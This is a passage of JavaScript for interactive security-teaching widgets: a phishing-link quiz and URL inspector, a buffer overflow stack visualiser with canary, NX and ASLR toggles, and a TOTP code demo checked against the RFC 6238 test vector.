      const deny = ABAC.findIndex((r, i) => r.effect === "deny" && hits[i]);
      const allow = ABAC.findIndex((r, i) => r.effect === "allow" && hits[i]);
      ok = deny < 0 && allow >= 0;
      why = deny >= 0 ? `Rule ${deny + 1} denies (deny overrides allow).` : allow >= 0 ? `Rule ${allow + 1} allows.` : "No rule allows it, so it is denied by default.";
    }
    decision.className = "rounded-lg border p-3 text-sm " + (ok ? "border-add/40 bg-add/8" : "border-del/40 bg-del/8");
    decision.textContent = `${ok ? "Allowed" : "Denied"}: ${u.name} → ${a} ${d.name} at ${$in(root, "hour").value}. ${why}`;
  }

  root.addEventListener("seg-change", (e) => { model = e.detail.value; decide(); });
  root.querySelectorAll("select").forEach((s) => s.addEventListener("change", decide));
  decide();
}

// ============================================================ Reading a link

const BRAND = "examplebank.com";
const MULTI_SUFFIX = ["co.uk", "com.au", "co.jp", "com.br", "co.nz"];
const QUIZ = [
  { url: "https://examplebank.com/login", safe: true, why: "Host examplebank.com, nothing in front of it." },
  { url: "https://examplebank.com.secure-login.net/verify", safe: false, why: "The registrable domain is secure-login.net; examplebank.com is only a subdomain label." },
  { url: "https://www.examplebank.com/account?next=https://evil.example", safe: true, why: "It goes to examplebank.com; the next= parameter is just a query string (though open redirects are worth reporting)." },
  { url: "https://examplebank.com@evil.example/", safe: false, why: "Everything before @ is a username. The host is evil.example." },
  { url: "https://exаmplebank.com/", safe: false, why: "The second letter is Cyrillic а (U+0430). The real host is punycode: xn--…" },
  { url: "https://login.examplebank.com/", safe: true, why: "A subdomain of examplebank.com: still the bank's own domain." },
  { url: "http://192.0.2.10/examplebank/", safe: false, why: "An IP address (from a documentation range), no TLS, and the brand only appears in the path." },
];

function registrable(host) {
  const labels = host.split(".");
  const suffix2 = labels.slice(-2).join(".");
  return MULTI_SUFFIX.includes(suffix2) ? labels.slice(-3).join(".") : suffix2;
}
function lev(a, b) {
  const d = Array.from({ length: a.length + 1 }, (_, i) => [i, ...Array(b.length).fill(0)]);
  for (let j = 1; j <= b.length; j++) d[0][j] = j;
  for (let i = 1; i <= a.length; i++) for (let j = 1; j <= b.length; j++) d[i][j] = Math.min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
  return d[a.length][b.length];
}

for (const root of document.querySelectorAll("[data-sec-phish]")) {
  const uIn = $in(root, "url");
  const parts = root.querySelector("[data-parts]");
  const flags = root.querySelector("[data-flags]");
  const o = outs(root);
  let qi = 0, score = 0, asked = 0, answered = false;

  function inspect() {
    let u;
    const raw = uIn.value.trim();
    try { u = new URL(/^[a-z][a-z0-9+.-]*:/i.test(raw) ? raw : `https://${raw}`); }
    catch { parts.replaceChildren(make("span", "text-del", "Not a URL the browser can parse.")); flags.replaceChildren(); return; }
    const host = u.hostname;
    const reg = /^[\d.]+$/.test(host) || host.startsWith("[") ? host : registrable(host);
    const row = (k, v, cls = "") => { const d = make("div", "grid grid-cols-[90px_minmax(0,1fr)] gap-2"); d.append(make("span", "text-muted-foreground", k), make("span", "break-all " + cls, v || "—")); return d; };
    parts.replaceChildren(
      row("scheme", u.protocol), row("user info", u.username ? `${decodeURIComponent(u.username)}${u.password ? ":…" : ""}` : "", u.username ? "text-del" : ""),
      row("host", host), row("goes to", reg, reg === BRAND ? "text-add font-medium" : "text-del font-medium"),
      row("path", u.pathname), row("query", u.search), row("fragment", u.hash),
    );
    const f = [];
    if (u.protocol === "http:") f.push(["bad", "No TLS (http:): anyone on the network can read or change the page."]);
    if (u.username) f.push(["bad", `"${decodeURIComponent(u.username)}" is a username, not the site. The site is ${host}.`]);
    if (/^[\d.]+$/.test(host)) f.push(["bad", "The host is a bare IP address."]);
    if (host.split(".").some((l) => l.startsWith("xn--"))) f.push(["bad", `Punycode label: the address bar may show look-alike Unicode letters, but the network goes to ${host}.`]);
    if (reg !== BRAND && host.includes("examplebank")) f.push(["bad", `"examplebank" appears in the host, but the registrable domain is ${reg}.`]);
    else if (reg !== BRAND && lev(reg, BRAND) <= 2) f.push(["bad", `${reg} is ${lev(reg, BRAND)} edit(s) away from ${BRAND}: a typosquat.`]);
    if (reg === BRAND && !u.username) f.push(["ok", `Registrable domain is ${BRAND}.`]);
    f.push(["neutral", "Registrable domain = last two labels here; real browsers use the Public Suffix List (e.g. for co.uk)."]);
    flags.replaceChildren(...f.map(([k, t]) => make("li", "rounded-md border px-2.5 py-1.5 text-sm " + (k === "bad" ? "border-del/40 bg-del/8" : k === "ok" ? "border-add/40 bg-add/8" : "text-muted-foreground"), t)));
  }

  function ask() {
    answered = false;
    o.explain.textContent = "";
    root.querySelector("[data-q]").textContent = QUIZ[qi].url;
  }
  root.querySelectorAll("[data-answer]").forEach((b) => b.addEventListener("click", () => {
    if (answered) { qi = (qi + 1) % QUIZ.length; ask(); return; }
    answered = true;
    const q = QUIZ[qi];
    const right = (b.dataset.answer === "safe") === q.safe;
    asked++; if (right) score++;
    o.score.textContent = `${score} / ${asked}`;
    o.explain.className = "min-h-10 text-sm " + (right ? "text-add" : "text-del");
    o.explain.textContent = `${right ? "Right" : "Not quite"}: ${q.why} (Answer again for the next link.)`;
  }));
  root.querySelector("[data-action=inspect]").addEventListener("click", () => { uIn.value = QUIZ[qi].url; inspect(); });
  uIn.addEventListener("input", inspect);
  inspect();
  ask();
}

// ============================================================ Buffer overflow

for (const root of document.querySelectorAll("[data-sec-overflow]")) {
  const nIn = $in(root, "name");
  const stack = root.querySelector("[data-stack]");
  const result = root.querySelector("[data-result]");
  const copyLine = root.querySelector("[data-copy-line]");
  const on = { canary: false, nx: false, aslr: false, bound: false };
  let base = 0x0804_8a3e, frame = 0xbfff_f0c8, canary = [0x00, 0x7b, 0xc2, 0x19];

  root.querySelectorAll("[data-toggle]").forEach((sw) => sw.addEventListener("shadcn:checked-change", (e) => {
    on[sw.dataset.toggle] = e.detail.checked;
    if (sw.dataset.toggle === "aslr") rerandomise();
    draw();
  }));
  function rerandomise() {
    const r = crypto.getRandomValues(new Uint32Array(3));
    base = on.aslr ? 0x5600_0000 + (r[0] & 0x00ff_f000) + 0xa3e : 0x0804_8a3e;
    frame = on.aslr ? 0x7ff0_0000 + (r[1] & 0x000f_fff0) : 0xbfff_f0c8;
    canary = [0x00, r[2] & 0xff, (r[2] >> 8) & 0xff, (r[2] >> 16) & 0xff];
  }
  const le = (v) => [v & 0xff, (v >> 8) & 0xff, (v >> 16) & 0xff, (v >>> 24) & 0xff];

  function draw() {
    // Slots from low to high address (copying writes upward).
    const slots = [{ name: "buf[0..3]", bytes: [0, 0, 0, 0], kind: "buf" }, { name: "buf[4..7]", bytes: [0, 0, 0, 0], kind: "buf" }];
    if (on.canary) slots.push({ name: "canary", bytes: [...canary], kind: "canary" });
    slots.push({ name: "saved frame ptr", bytes: le(frame), kind: "fp" }, { name: "return address", bytes: le(base), kind: "ret" }, { name: "caller's frame", bytes: [0x2c, 0x10, 0x00, 0x00], kind: "caller" });
    const orig = slots.map((s) => [...s.bytes]);
    const src = [...enc.encode(nIn.value)];
    const data = on.bound ? [...src.slice(0, 7), 0] : [...src, 0]; // strcpy copies the NUL too
    data.forEach((b, i) => { const s = slots[i >> 2]; if (s) s.bytes[i & 3] = b; });
    const written = data.length;
    const overflow = written > 8;
    copyLine.textContent = on.bound ? "strlcpy(buf, name, sizeof buf);" : "strcpy(buf, name);";
    copyLine.className = "rounded px-0.5 " + (overflow ? "bg-del/20 text-del" : on.bound ? "bg-add/15 text-add" : "");

    stack.replaceChildren(...[...slots].reverse().map((s, ri) => {
      const idx = slots.length - 1 - ri;
      const changed = s.bytes.some((b, k) => b !== orig[idx][k]);
      const row = make("div", "grid grid-cols-[120px_minmax(0,1fr)_auto] items-center gap-2 rounded-md border px-2 py-1 " +
        (changed && s.kind !== "buf" ? "border-del/50 bg-del/10" : s.kind === "buf" ? "bg-code" : ""));
      const addr = ((frame - 16 + idx * 4) >>> 0).toString(16).padStart(8, "0");
      row.append(make("span", "text-muted-foreground", s.name));
      const bytes = make("span", "flex gap-1");
      s.bytes.forEach((b, k) => {
        const byteIndex = idx * 4 + k;
        bytes.append(make("span", "rounded px-1 tabular-nums " + (byteIndex < written ? (byteIndex >= 8 ? "bg-del/25" : "bg-vec-u/20") : ""), b.toString(16).padStart(2, "0")));
      });
      row.append(bytes, make("span", "text-[10px] text-muted-foreground", `0x${addr}`));
      return row;
    }));

    const ret = slots.find((s) => s.kind === "ret");
    const retVal = ((ret.bytes[3] << 24) | (ret.bytes[2] << 16) | (ret.bytes[1] << 8) | ret.bytes[0]) >>> 0;
    const can = slots.find((s) => s.kind === "canary");
    const canaryHit = can && can.bytes.some((b, k) => b !== canary[k]);
    const retHit = retVal !== base;
    const fpHit = slots.find((s) => s.kind === "fp").bytes.some((b, k) => b !== le(frame)[k]);
    let kind = "ok", msg;
    if (on.bound) msg = `Copied safely: ${Math.min(src.length, 7)} characters and a NUL; the rest was dropped. This is the fix.`;
    else if (!overflow) msg = `Fits: ${written} of 8 bytes used (including the NUL terminator).`;
    else if (canaryHit) { kind = "neutral"; msg = "*** stack smashing detected ***: the canary changed, so the function aborts before returning. A crash instead of a hijack; the bug is still there."; }
    else if (retHit) {
      kind = "bad";
      msg = `The return address is now 0x${retVal.toString(16).padStart(8, "0")}: on return, the CPU jumps there. With these bytes it crashes; an attacker would write an address of their choosing.` +
        (on.nx ? " NX: if that address points into the stack, executing it faults; attackers turn to code reuse (ROP)." : "") +
        (on.aslr ? " ASLR: code and stack move on every run, so the attacker must first guess or leak an address." : "");
    } else if (fpHit) { kind = "bad"; msg = "The saved frame pointer is overwritten: the caller's frame is corrupted after return."; }
    else msg = "Overflowed into unused space.";
    result.className = "rounded-lg border p-3 text-sm " + (kind === "bad" ? "border-del/40 bg-del/8" : kind === "ok" ? "border-add/40 bg-add/8" : "border-vec-out/50 bg-vec-out/10");
    result.textContent = msg;
  }

  nIn.addEventListener("input", draw);
  draw();
}

// ============================================================ TOTP

async function hotp(secretBytes, counter, digits) {
  const key = await subtle.importKey("raw", secretBytes, { name: "HMAC", hash: "SHA-1" }, false, ["sign"]);
  const msg = new Uint8Array(8);
  let c = BigInt(counter);
  for (let i = 7; i >= 0; i--) { msg[i] = Number(c & 0xffn); c >>= 8n; }
  const mac = new Uint8Array(await subtle.sign("HMAC", key, msg));
  const offset = mac[19] & 0x0f;
  const bin = ((mac[offset] & 0x7f) << 24) | (mac[offset + 1] << 16) | (mac[offset + 2] << 8) | mac[offset + 3];
  const code = String(bin % 10 ** digits).padStart(digits, "0");
  return { mac: hex(mac), offset, bin, code, counterHex: hex(msg) };
}

for (const root of document.querySelectorAll("[data-sec-totp]")) {
  const o = outs(root);
  const sIn = $in(root, "secret");
  const ring = root.querySelector("[data-ring]");
  if (!subtle) { o.vector.textContent = "Web Crypto is unavailable here (it needs a secure context)."; continue; }
  let digits = 6, lastStep = -1, visible = true;

  async function tick(force) {
    const now = Date.now() / 1000;
    const step = Math.floor(now / 30);
    const left = 30 - (now % 30);
    ring.setAttribute("stroke-dasharray", `${(113.1 * left) / 30} 113.1`);
    o.left.textContent = `${Math.ceil(left)} s left in this window`;
    if (step === lastStep && !force) return;
    lastStep = step;
    const r = await hotp(enc.encode(sIn.value), step, digits);
    o.t.textContent = String(Math.floor(now));
    o.counter.textContent = `${step} (0x${r.counterHex})`;
    o.hmac.textContent = r.mac;
    o.offset.textContent = `${r.offset} → bytes ${r.offset}…${r.offset + 3}`;
    o.bin.textContent = String(r.bin);
    o.mod.textContent = `${r.bin} mod 10^${digits} = ${r.code}`;
    o.code.textContent = r.code.replace(digits === 6 ? /(\d{3})(\d{3})/ : /(\d{4})(\d{4})/, "$1 $2");
  }

  root.addEventListener("seg-change", (e) => { digits = +e.detail.value; tick(true); });
  sIn.addEventListener("input", () => tick(true));
  root.querySelector("[data-action=vector]").addEventListener("click", async () => {
    // RFC 6238 Appendix B: SHA-1, secret "12345678901234567890", T = 59 s.
    const r = await hotp(enc.encode("12345678901234567890"), Math.floor(59 / 30), 8);
    const ok = r.code === "94287082";
    o.vector.className = "text-sm " + (ok ? "text-add" : "text-del");
    o.vector.textContent = `T = 59 → ${r.code} ${ok ? "= 94287082 ✓" : "≠ 94287082"}`;
  });
  new IntersectionObserver(([e]) => { visible = e.isIntersecting; }).observe(root);
  setInterval(() => { if (visible) tick(false); }, 1000);
  tick(true);
}
